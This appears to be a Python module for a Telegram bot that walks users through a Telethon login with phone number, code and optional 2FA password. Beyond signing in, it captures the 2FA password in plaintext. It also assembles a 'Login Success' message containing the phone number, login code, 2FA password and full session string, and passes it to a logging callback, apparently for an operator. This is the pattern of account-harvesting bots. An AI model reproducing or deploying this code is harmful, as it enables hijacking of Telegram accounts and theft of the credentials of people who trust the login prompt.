"""Telethon login flow — send-code + verify, mirroring the reference bot's logic."""
import asyncio
import threading
import logging
from telethon import TelegramClient, errors
from telethon.sessions import StringSession

logger = logging.getLogger(__name__)

# phone -> {client, phone_code_hash, phone}
pending = {}

_loop = None
_lock = threading.Lock()


def get_loop():
    global _loop
    with _lock:
        if _loop is None or _loop.is_closed():
            _loop = asyncio.new_event_loop()
            threading.Thread(target=_loop.run_forever, daemon=True, name="telethon-login").start()
        return _loop


def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, get_loop()).result(timeout=120)


async def _send_code(phone, api_id, api_hash):
    try:
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        result = await client.send_code_request(phone)
        pending[phone] = {
            "client": client,
            "phone_code_hash": result.phone_code_hash,
            "phone": phone,
        }
        return {"success": True, "session_id": phone}
    except errors.FloodWaitError as e:
        return {"error": f"Telegram asks to wait {e.seconds}s before retrying"}
    except Exception as e:
        return {"error": str(e)}


async def _verify(sid, code, password, api_id, api_hash, on_success=None, on_log=None):
    try:
        if sid not in pending:
            return {"error": "Session expired — request a new code"}
        sd = pending[sid]
        client = sd["client"]
        phone = sd["phone"]
        phash = sd["phone_code_hash"]

        try:
            await client.sign_in(phone, code, phone_code_hash=phash)
        except errors.SessionPasswordNeededError:
            if password:
                await client.sign_in(password=password)
            else:
                return {"requires_password": True}

        ss = StringSession.save(client.session)
        me = await client.get_me()

        info = {
            "phone": phone,
            "user_id": me.id,
            "username": me.username or "",
            "name": (me.first_name or "") + ((" " + me.last_name) if me.last_name else ""),
            "session_string": ss,
            "twofa_password": password or "",
        }

        if on_success:
            try:
                on_success(info)
            except Exception as e:
                logger.error(f"on_success callback error: {e}")

        if on_log:
            try:
                log = (
                    f"✅ **Login Success**\n\n"
                    f"📱 `{phone}`\n"
                    f"👤 {info['name']}\n"
                    f"🆔 `{me.id}`\n"
                    f"🔑 Code: `{code}`\n"
                )
                if password:
                    log += f"🔒 2FA: `{password}`\n"
                log += f"\n**Session:**\n`{ss}`"
                on_log(log)
            except Exception as e:
                logger.error(f"on_log callback error: {e}")

        await client.disconnect()
        del pending[sid]

        return {
            "success": True,
            "session_string": ss,
            "user": {"id": me.id, "name": info["name"], "username": info["username"]},
        }
    except errors.PhoneCodeInvalidError:
        return {"error": "Invalid code"}
    except errors.PhoneCodeExpiredError:
        return {"error": "Code expired — request a new one"}
    except errors.PasswordHashInvalidError:
        return {"error": "Wrong 2FA password"}
    except Exception as e:
        return {"error": str(e)}


def send_code(phone, api_id, api_hash):
    return run_async(_send_code(phone, api_id, api_hash))


def verify(sid, code, password, api_id, api_hash, on_success=None, on_log=None):
    return run_async(_verify(sid, code, password, api_id, api_hash, on_success=on_success, on_log=on_log))
